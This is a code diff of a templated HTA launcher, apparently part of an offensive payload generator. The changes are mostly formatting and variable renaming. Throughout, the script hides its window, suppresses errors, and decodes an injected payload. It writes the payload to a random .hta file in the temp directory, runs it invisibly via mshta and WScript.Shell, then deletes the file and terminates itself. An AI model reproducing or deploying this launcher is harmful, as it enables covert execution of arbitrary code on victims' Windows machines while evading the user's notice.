@@ -9,12 +9,13 @@
      window.resizeTo(2, 4);
      window.onerror = function(sMsg, sUrl, sLine) { return false; }
      window.onfocus = function() { window.blur(); }
-     var {{variables['file-system-object'][0]}} = {{variables['file-system-object'][1]}}
-     var {{variables['wscript.shell'][0]}} = {{variables['wscript.shell'][1]}}
-     var {{variables['tmp'][0]}} = {{variables['tmp'][1]}}
-     var mshta = unescape("{{code}}")
+     var {{variables['file-system-object'][0]}} = {{variables['file-system-object'][1]}};
+     var {{variables['wscript.shell'][0]}} = {{variables['wscript.shell'][1]}};
+     var {{variables['tmp'][0]}} = {{variables['tmp'][1]}};
+     var mshta = unescape("{{ mshta_code }}");
+ } catch (e) {
+   kill();
  }
- catch (e){kill()}
 
 function kill() {
   try {
@@ -37,21 +38,24 @@ function kill() {
 
 function main(){
   try {
-    var path = {{variables['tmp'][0]}} + "\\" + "{{variables['random_str']}}" + ".hta";
+    var path = {{variables['tmp'][0]}} + "\\" + "{{ random_string }}" + ".hta";
     var fd = {{variables['file-system-object'][0]}}.CreateTextFile(path);
     fd.WriteLine(mshta);
     fd.close();
-    {{variables['wscript.shell'][0]}}.run("mshta " + path, 0, false)
+    {{variables['wscript.shell'][0]}}.run("mshta " + path, 0, false);
     var now = new Date().getTime();
     while((new Date().getTime() - now) < 5000){
       // do nothing
     }
     {{variables['file-system-object'][0]}}.DeleteFile(path);
-    kill()
-  } catch (e) {kill()}
+    kill();
+  } catch (e) {
+    kill();
+  }
 }
 
-main()
+main();
+
  </script>
  <hta:application caption="no" windowtate="minimize" showInTaskBar="no" scroll="no" navigable="no" />
  </head>
